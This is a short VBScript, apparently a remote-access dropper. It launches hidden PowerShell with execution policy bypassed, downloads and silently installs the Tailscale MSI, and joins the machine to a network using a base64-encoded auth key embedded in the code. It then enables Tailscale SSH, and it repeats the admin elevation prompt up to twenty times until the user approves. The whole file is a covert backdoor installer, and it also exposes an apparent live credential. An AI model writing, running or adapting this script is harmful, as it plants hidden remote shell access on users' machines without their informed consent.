Set sh  = CreateObject("Shell.Application")
Set fso = CreateObject("Scripting.FileSystemObject")
m = fso.GetSpecialFolder(2) & "\ts_start.flag"

On Error Resume Next
fso.DeleteFile m, True
On Error GoTo 0
If fso.FileExists(m) Then WScript.Quit 1

p = "$b64='dHNrZXktYXV0aC1rb1ZEYXVZODRDMjFDTlRSTC1ZWkd2ZDg3TmhFU3FGa29SZXBCREZTM0N3Mmoxa1FMYmQ=';" & _
    "New-Item -ItemType File -Path '" & m & "' -Force | Out-Null;" & _
    "$k=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($b64));" & _
    "$x=[IO.Path]::GetTempFileName()+'.msi';" & _
    "(New-Object Net.WebClient).DownloadFile('https://pkgs.tailscale.com/stable/tailscale-setup-latest-amd64.msi',$x);" & _
    "Start-Process msiexec -ArgumentList '/i',""$x"",'/quiet','/norestart','TS_NOLAUNCH=1' -Wait -WindowStyle Hidden;" & _
    "Remove-Item $x -Force;" & _
    "& 'C:\Program Files\Tailscale\tailscale.exe' up --auth-key=$k --unattended *>$null;" & _
    "& 'C:\Program Files\Tailscale\tailscale.exe' set --ssh;"

For i = 1 To 20
    sh.ShellExecute "powershell", "-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -Command """ & p & """", "", "runas", 0
    For j = 1 To 5000
        If fso.FileExists(m) Then
            fso.DeleteFile m
            WScript.Quit 0
        End If
    Next
Next

WScript.Quit 1
